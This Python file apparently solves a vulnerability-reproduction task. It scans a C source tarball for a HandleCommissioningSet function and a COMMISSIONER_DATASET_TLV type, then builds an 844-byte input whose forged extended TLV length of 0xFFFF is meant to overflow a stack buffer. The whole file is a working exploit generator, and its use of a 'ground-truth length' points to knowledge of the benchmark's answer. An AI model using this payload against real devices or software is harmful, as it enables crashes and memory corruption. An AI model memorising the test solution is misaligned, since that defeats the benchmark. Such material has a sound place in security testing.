import tarfile
import tempfile
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract buffer size and TLV type from source
        buffer_size, tlv_type = self._analyze_source(src_path)
        
        # Generate PoC with extended TLV length that overflows buffer
        # Use ground-truth length of 844 bytes
        header_len = 4  # 1 byte type, 1 byte 0xFF, 2 byte extended length
        value_len = 844 - header_len
        
        # Set extended length to 0xFFFF (65535) to ensure overflow
        # and mismatch with actual value length
        tlv_header = bytes([
            tlv_type,        # TLV type
            0xFF,            # Extended length indicator
            0xFF,            # Length high byte (0xFF)
            0xFF             # Length low byte (0xFF)
        ])
        
        # Fill value with pattern to trigger overflow
        value = b'A' * value_len
        return tlv_header + value
    
    def _analyze_source(self, src_path: str):
        # Default values if analysis fails
        buffer_size = 256
        tlv_type = 0x00
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                with tempfile.TemporaryDirectory() as tmpdir:
                    tar.extractall(tmpdir)
                    
                    # Find C source files
                    c_files = []
                    for root, dirs, files in os.walk(tmpdir):
                        for f in files:
                            if f.endswith('.c') or f.endswith('.h'):
                                c_files.append(os.path.join(root, f))
                    
                    # Search for HandleCommissioningSet function
                    func_code = None
                    for file_path in c_files:
                        with open(file_path, 'r', errors='ignore') as f:
                            content = f.read()
                            if re.search(r'\bHandleCommissioningSet\s*\(', content):
                                # Extract function body
                                lines = content.split('\n')
                                in_func = False
                                brace_count = 0
                                func_lines = []
                                for line in lines:
                                    if in_func:
                                        func_lines.append(line)
                                        brace_count += line.count('{')
                                        brace_count -= line.count('}')
                                        if brace_count == 0:
                                            break
                                    elif re.search(r'\bHandleCommissioningSet\s*\(', line):
                                        in_func = True
                                        func_lines.append(line)
                                        brace_count = 1
                                func_code = '\n'.join(func_lines)
                                break
                    
                    if func_code:
                        # Look for stack buffer array
                        pattern = r'(uint8_t|char|unsigned char)\s+\w+\s*\[\s*(\d+)\s*\]'
                        match = re.search(pattern, func_code)
                        if match:
                            buffer_size = int(match.group(2))
                        
                        # Look for TLV type constant
                        for file_path in c_files:
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read()
                                # Try #define pattern
                                pattern = r'#define\s+COMMISSIONER_DATASET_TLV\s+0x([0-9A-Fa-f]+)'
                                match = re.search(pattern, content, re.IGNORECASE)
                                if match:
                                    tlv_type = int(match.group(1), 16)
                                    break
                                # Try enum pattern
                                pattern = r'COMMISSIONER_DATASET_TLV\s*=\s*0x([0-9A-Fa-f]+)'
                                match = re.search(pattern, content, re.IGNORECASE)
                                if match:
                                    tlv_type = int(match.group(1), 16)
                                    break
                                # Try literal in function
                                pattern = r'tlvType\s*==\s*0x([0-9A-Fa-f]+)'
                                match = re.search(pattern, func_code)
                                if match:
                                    tlv_type = int(match.group(1), 16)
                                    break
        except Exception:
            # Use defaults if any error occurs
            pass
            
        return buffer_size, tlv_type